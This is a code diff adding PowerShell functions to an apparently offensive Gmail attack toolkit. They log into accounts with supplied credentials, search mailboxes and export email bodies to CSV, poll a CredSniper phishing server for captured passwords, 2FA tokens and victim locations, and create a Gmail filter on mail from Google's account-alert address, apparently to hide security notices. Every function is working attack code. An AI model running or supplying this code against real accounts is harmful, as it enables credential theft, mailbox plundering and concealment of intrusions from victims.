+        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
+        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
+        $GetIKRequest.Content -match @'
+(?<=user key\ ')[A-Za-z0-9]*(?='\")
+'@ | Out-null
+        $ik = $Matches[0]
+        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+           
+        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
+        $at = $Matches[0]
+        
+        $SearchRequest = Invoke-WebRequest -WebSession $googlesession -Method Post -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&at=$at&view=tl&start=0&num=1000&mb=0&rt=c&q=$search&search=query"
+
+        $SearchResultsJson = $SearchRequest.Content -split "\n"
+        $SearchJson = $SearchResultsJson[3]
+        $MainResultsJson = $SearchResultsJson[5]
+
+        $json1 = $SearchJson | ConvertFrom-Json
+        $finaljson = $MainResultsJson | ConvertFrom-Json
+
+        [int]$totalresults = $json1[5][2]
+        
+        Write-Output "[*] $totalresults emails found that match the search term $search."
+
+        Write-Output "[*] Getting email ids"
+        $i = 0
+        $emailids = @()
+        while ($i -lt $totalresults)
+        {
+            $emailids += $finaljson[0][2][$i][0]
+            $i++
+        }
+
+        $fullresultsarray = @()
+       
+
+        $count = 1
+        foreach ($eid in $emailids)
+        {
+            Write-Output "[*] Now checking email $count of $totalresults."
+            $EmailParam = "s_jr=[null,[[null,null,[null,`"$eid`",`"*`",false,true,true,null,null,null,null,null]]],2,null,null,null,`"$ik`"]"
+            $EmailRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $EmailParam
+
+            $EmailJson = $EmailRequest.Content -split "&\["
+            $EmailJson = "[" + $EmailJson[1]
+            $emailfinaljson = $EmailJson | ConvertFrom-Json
+            $MailSubject = $emailfinaljson[1][0][3][1][5][0][5]
+            $MailSender = $emailfinaljson[1][0][3][1][5][0][7]
+            $MailReceiver = $emailfinaljson[1][0][3][1][5][0][8][0][1]
+            $MailBody = $emailfinaljson[1][0][3][1][5][0][3][0][2]
+
+            $EmailObject = New-Object System.Object
+            $EmailObject | Add-Member -Type NoteProperty -name Subject -Value $MailSubject
+            $EmailObject | Add-Member -Type NoteProperty -name Sender -Value $MailSender[1]
+            $EmailObject | Add-Member -Type NoteProperty -name Receiver -Value $MailReceiver
+            $EmailObject | Add-Member -Type NoteProperty -name Body -Value $MailBody
+            $fullresultsarray += $EmailObject
+
+            Write-Output "Subject: $MailSubject"
+            Write-Output "Sender: $MailSender"
+            Write-Output "Receiver: $MailReceiver"     
+          
+            Write-Output "`n"
+            $count++
+        }
+        
+
+        $fullresultsarray | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace "`n",'\n' -replace "`r",'\n' -replace ",",'&#44;'}
+        $fullresultsarray | Export-Csv -Encoding UTF8 $OutputCsv
+        Write-Output "[*] Results have been written to $OutputCsv."
+}
+
+Function Invoke-MonitorCredSniper{
+
+    Param
+    (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $ApiToken = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $CredSniper = "",
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [int]
+        $Interval = 1
+    )
+
+    Write-Output "[*] Initializing CredSniper monitor..."
+
+    # Collection of seen usernames
+    $Seen = New-Object System.Collections.ArrayList
+
+    # Stay Looping
+    while(1)
+    {
+        # Properly setup URI and make request to CredSniper API
+        $CredSniper = $CredSniper.trim('/')
+        $CredSniperRequest = Invoke-WebRequest -Uri "$CredSniper/creds/view?api_token=$ApiToken"
+        $CredsJson = $CredSniperRequest.Content | ConvertFrom-Json
+
+        # Loop through credentials from CredSniper
+        foreach($cred in $CredsJson.creds)
+        {
+            # CredSniper internal identifier for credential
+            $cred_id = $cred.cred_id
+
+            # IP Address of Victim
+            $ip_address = $cred.ip_address
+
+            # Username/Email captured
+            $username = $cred.username
+
+            # Password captured
+            $password = $cred.password
+
+            # GeoIP City
+            $city = $cred.city
+
+            # GeoIP Region/State
+            $region = $cred.region
+
+            # GeoIP Zip Code
+            $zip_code = $cred.zip_code
+
+            # 2FA Type (sms, authenticator, touchscreen, u2f)
+            $twofactor_type = $cred.two_factor_type
+
+            # 2FA Token
+            $twofactor_token = $cred.two_factor_token
+
+            # CredSniper internal marked as seen flag
+            $already_seen = $cred.seen
+
+            # Check to see if username has already been seen
+            If ($Seen -notcontains $username)
+            {
+                # Monitor if we have already seen this credential so we don't hit duplicates
+                $Seen.Add($username) | out-null
+
+                # Print output for user
+                Write-Output "[*] $username, $password, $twofactor_type, $twofactor_token, $city, $region, $zip_code"
+            }
+        }
+
+        # Sleep for a little while
+        Start-Sleep -seconds $Interval
+    }
+}
+
+Function Invoke-AddGmailRule{
+
+    Param
+    (
+
+        [Parameter(Position = 0, Mandatory = $true)]
+        [string]
+        $EmailAddress = "",
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [string]
+        $Password = ""
+    )
+
+        #Start a new Google session and input the email address of the user who will be creating the event
+        $SessionRequest = Invoke-WebRequest -Uri 'https://accounts.google.com/signin' -SessionVariable googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $EmailForm = $SessionRequest.Forms[0]
+        $EmailForm.Fields["Email"]= $EmailAddress
+        $EmailSubmitRequest = Invoke-WebRequest -Uri ("https://accounts.google.com/signin/v1/lookup") -WebSession $googlesession -Method POST -Body $EmailForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+
+        #Submit the authentication for the user and maintain a valid session in $googlesession
+        $PasswordForm = $EmailSubmitRequest.Forms[0]
+        $PasswordForm.Fields["Email"]= $EmailAddress
+        $PasswordForm.Fields["Passwd"]= $Password
+        Write-Output "[*] Now logging into account with provided credentials"
+        $PasswordUrl = "https://accounts.google.com/signin/challenge/sl/password"
+        $PasswordSubmitRequest = Invoke-WebRequest -Uri $PasswordUrl -WebSession $googlesession -Method POST -Body $PasswordForm.Fields -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome)
+        $cookies = $googlesession.Cookies.GetCookies($PasswordUrl)
+        foreach ($cookie in $cookies)
+        {
+            if (($cookie.name -eq 'SID') -and ($cookie.value -ne ""))
+            {
+                $PrimarySIDExists = $true
+            }
+        }
+        if ($PrimarySIDExists)
+        {
+            Write-Output "[*] Authentication appears to be successful"
+        }
+        else
+        {
+            Write-Output "[*] Authentication appears to have failed. Check the credentials."
+            break
+        }
+
+
+        #Parse 'ik' and 'at'
+        $SettingsLoad = Invoke-WebRequest -Uri ("https://mail.google.com/mail/u/0/#settings/filters") -WebSession $googlesession -UserAgent ([Microsoft.PowerShell.Commands.PSUserAgent]::Chrome) -Headers @{'Accept'='text/html, application/xhtml+xml, image/jxr, */*'}
+        Write-Output "[*] Obtaining 'ik' and 'at'"
+
+        $GetIKParam = 's_jr=[null,[[null,null,null,null,null,null,[null,true,false]],[null,[null,"test",0,null,30,null,null,null,false,[],[]]]],2,null,null,null,""]'
+        $GetGmailSession = Invoke-WebRequest -Uri "https://mail.google.com/mail" -WebSession $googlesession
+        $GetIKRequest = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/s/?v=or" -WebSession $googlesession -Method POST -Body $GetIKParam
+        $GetIKRequest.Content -match @'
+(?<=user key\ ')[A-Za-z0-9]*(?='\")
+'@ | out-null
+
+        $ik = $Matches[0]
+
+        $SettingsLoad.tostring() -match '(?<=GM_ACTION_TOKEN=\").*(?=\";var)' | out-null
+        $at = $Matches[0]
+
+        $GEventHeaders = @{'Accept'='*/*';'X-Same-Domain'='1';'Content-Type'='application/x-www-form-urlencoded;charset=utf-8';'Referer'='https://mail.google.com/render?pli=1';'Accept-Language'='en-US';'Accept-Encoding'='gzip; deflate';'User-Agent'='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv=11.0) like Gecko';'Host'='mail.google.com';'Cache-Control'='no-cache'}
+        $GEventParams = "search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb&cf2_tr=true&"
+
+        #Adding rule
+        Write-Output "[*] Now adding filter rule into Gmail settings"
+        $RuleAdding = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/?ui=2&ik=$ik&jsver=a&rid=a&at=$at&view=up&act=cf&_reqid=a&pcd=1&cfact=a&cfinact=a&mb=0&rt=c&search=cf&cf1_from=no-reply%40accounts.google.com&cf1_sizeoperator=s_sl&cf1_sizeunit=s_smb" -WebSession $googlesession -Method POST -Headers $GEventHeaders -Body $GEventParams
+
+        #Rule verification
+        $CheckingRuleExists = Invoke-WebRequest -Uri "https://mail.google.com/mail/u/0/#settings/filters" -WebSession $googlesession -Method GET -Headers $GEventHeaders
+        if($CheckingRuleExists.tostring() -match 'no-r<wbr>eply@accou<wbr>nts.google<wbr>.com')
+        {
+            Write-Output "`nLooks like something may have gone wrong. Maybe login to Gmail directly and check to see if the rule was created."
+        } else {
+            Write-Output "[*] Success! The rule has been added successfuly`n"
+        }
 }
